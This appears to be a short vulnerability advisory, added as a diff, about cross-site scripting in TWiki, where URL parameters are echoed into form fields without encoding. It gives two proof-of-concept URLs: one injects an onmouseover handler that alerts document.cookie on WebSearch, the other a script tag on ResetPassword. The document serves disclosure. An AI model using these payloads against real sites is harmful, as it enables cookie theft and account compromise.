@@ -1,0 +1,9 @@
+An HTML form field must exist containing an input value with specifying an encoding. As an example:
+
+<input type="text" name="city" value="%URLPARAM{ "city" }%" />
+
+THe following examples will then demonstrate this issue:
+
+http://example.com/twiki/view/TWiki/WebSearch?search=%27a%20onmouseover=alert(document.cookie)%20%27
+
+http://example.com/twiki/view/TWiki/ResetPassword?username="<script language=Javascript>alert('3y3 0wn j00 TWIKI')</script>
